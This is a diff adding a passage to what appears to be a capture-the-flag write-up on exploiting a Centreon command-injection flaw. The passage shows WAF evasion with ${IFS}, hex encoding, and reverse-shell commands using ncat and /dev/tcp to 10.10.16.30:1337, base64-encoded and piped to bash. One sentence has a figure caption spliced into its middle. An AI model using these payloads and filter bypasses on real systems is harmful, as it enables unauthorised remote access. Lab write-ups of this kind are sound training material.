@@ -250,6 +250,100 @@ else:
     exit()
 </pre>
 
+<p>Basically, this script signs in the Centreon panel using the provided credentials; then it modifies the
+    configuration of a poller called Central, and while doing so it places the command <code>ncat -e /bin/bash ip port</code> in the
+    field <code>nagios_bin</code>: this is the vulnerable field as explained in the post. Then it calls the <code>generateFiles.php</code> page
+    which launches the command in <code>nagios_bin</code>. If this script worked, we would just run <code>nc -vlp port</code> and launch
+    the script. We’re going now to figure out what happens.</p>
+
+<p>A way to do so is to understand what the exploit does and to try to do it by hand. Firstly, the exploit might fail
+    because of hard-coded values: when it gets the poller token, it tries to get the value of input field 24, which
+    doesn’t necessarily exist: we change that by the following line:</p>
+
+<pre class="prettyprint lang-py">
+poller_token = poller_soup.find('input', {'name' : 'centreon_token'}).get("value")
+</pre>
+
+<p>Then, we are going to try to create a poller by hand, and to set the <code>nagios_bin</code> field ourselves. First, we’re going
+    to duplicate the Central poller in order to run our tests without being bothered by someone else. As the script says,
+    we need to make this poller central, so we check “Yes” to the “Localhost ?” field. Then we write our command,
+    and see what happens when we save the poller configuration:</p>
+
+<figure>
+    <img src="/img/{{ page.code }}/wall_1.png" alt="Setting <code>nagios_bin</code> field" />
+    <figcaption>We set the <code>nagios_bin</code> field</figcaption>
+</figure>
+
+<figure>
+    <img src="/img/{{ page.code }}/wall_2.png" alt="The server shows a 403 status code" />
+    <figcaption>The server doesn't seem to like it</figcaption>
+</figure>
+
+<p>So now we remember something that we already learned earlier: the server responds <strong>Forbidden</strong> when we use the space
+    character in a form field. So we now know that we have to find a way to write a command without using any spaces.</p>
+
+<p>We can find a lot of ways to achieve that. For instance, if we want to run the command <code>echo hello world</code>, we can use:</p>
+
+<pre class="prettyprint nocode">
+$ {echo,hello,world}
+$ CMD=$'echo\x20hello\x20world'&&$CMD
+$ echo${IFS}hello${IFS}world
+</pre>
+
+<p>The third one is my favourite, as it uses efficiently the <em>Internal Field Separators</em>: the <code>$IFS</code>
+    variable contains several white-space characters which act as separators in a command line.</p>
+
+<p>So now we can try using this trick and writing in the <code>nagios_bin</code> field the command:</p>
+
+<pre class="prettyprint nocode">
+ncat${IFS}-e${IFS}/bin/bash${IFS}10.10.16.30${IFS}1337
+</pre>
+
+<p>However, it doesn’t work: we still get a 403 status code. At first I got stuck at this point, because I didn’t
+    see any other solution. However, I tried to do some other tests with the login form of the centreon panel, and I
+    found out that it was actually the word <code>ncat</code> that was triggering the WAF. This was kind of obvious: as the exploit
+    was already known, it wouldn’t be fun if you only had to execute the code to use it. Moreover, the person who found
+    the exploit is the maker of the box, so he wouldn’t want us to use the same exact exploit to own the box.</p>
+
+<p>So we can’t use the word <code>ncat</code> directly, so I decided that it could be better if I encoded this word. I came up with
+    the following line, which didn’t work:</p>
+
+<pre class="prettyprint nocode">
+CMD=$'\x6e\x63\x61\x74\x20-e\x20/bin/bash\x2010.10.16.30\x201337\x23'&&$CMD
+</pre>
+
+<p>So here the word <code>ncat</code> was written with hexadecimal characters <code>6E 63 61 74</code>: however this solution didn’t work for
+    a reason I didn’t really get at this time.</p>
+
+<p>I decided that it was time to test for other commands that could do the same job as <code>ncat</code>, and I found an interesting one:</p>
+
+<pre class="prettyprint nocode">
+$ exec sh -i >& /dev/tcp/10.10.16.30/1337 0>&1
+</pre>
+
+<p>This command starts a shell in interactive mode and redirects <code>stdout</code> and <code>stderr</code> to a TCP connection.
+    Then <code>stdin</code> is redirected to this connection as well. So bascially this commands does exactly what we want to do.</p>
+
+<p>To avoid having too difficult-to-read commands, I decided to encode this command with <code>base64</code> and just decode it once
+    it is in the <code>nagios_bin</code> field. So basically, we want to make the sThe server doesn’t seem to like iterver execute the following command:</p>
+
+<pre class="prettyprint nocode">
+echo${IFS}ZXhlYyBzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMC8xMzM3IDA+JjEK|base64${IFS}-d|bash;
+</pre>
+
+<p><strong>Note:</strong> we must finish with a <code>;</code> because the server executes the content of
+    <code>nagios_bin</code> but adds a few parameters at the end. This way, we execute our command regardless of what
+    follows it. I wanted first to end my command with <code>#</code>, but I remembered this character was banned by the WAF.</p>
+
+<p>So, we open a netcat listener with <code>nc -vlp 1337</code>, then we update the Central poller with our command,
+    and we execute the CVE script. In fact, we only have to execute the part where the script sends a post request to
+    <code>generateFiles.php</code>, because it’s this file which executes the content of <code>nagios_bin</code>. And, it works!</p>
+
+<img src="/img/{{ page.code }}/wall_shell.png" alt="We got a shell!" />
+
+
+<!-- Footnotes -->
+
 <hr />
 
 <sup id="fn1">1. https://fr.wikipedia.org/wiki/Centreon (in french)<a href="#ref1" title="Jump back to footnote 1 in the text.">↩</a></sup>
